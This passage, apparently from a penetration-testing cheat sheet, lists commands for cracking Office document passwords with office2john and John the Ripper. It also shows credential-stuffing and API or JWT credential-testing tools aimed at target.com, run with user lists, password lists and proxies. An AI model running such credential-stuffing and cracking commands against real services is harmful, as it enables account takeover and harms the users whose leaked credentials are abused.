# Explanation: Extracts and cracks PDF passwords

# Office Document Cracking
office2john.py document.docx > office_hash.txt
john office_hash.txt
# Use Case: Office document password cracking
# Explanation: Cracks Microsoft Office passwords

14.4 Credential Stuffing

Custom Credential Stuffing Tools
bash
# BlackWidow Credential Stuffing
python3 blackwidow.py -t target.com -c cookies.txt -p proxies.txt
# Use Case: Automated credential stuffing
# Explanation: Uses cookies and proxies for stuffing attacks

# SNIPR Credential Stuffing
python3 snipr.py -u users.txt -p passwords.txt -t target.com -f login_form
# Use Case: Form-based credential stuffing
# Explanation: Targets specific login forms

# AccountChecker Tool
AccountChecker.exe -c config.json -u users.txt -p passwords.txt -t 10
# Use Case: Multi-threaded credential checking
# Explanation: Checks credentials across multiple threads

API Credential Testing
bash
# REST API Credential Testing
python3 api_tester.py --endpoint https://api.target.com/auth --users users.txt --passwords passwords.txt --method POST
# Use Case: API credential stuffing
# Explanation: Tests credentials against API endpoints

# JWT Token Testing
python3 jwt_tester.py --tokens tokens.txt --endpoint https://api.target.com/protected
# Use Case: JWT token validation
# Explanation: Tests JWT tokens against protected endpoints

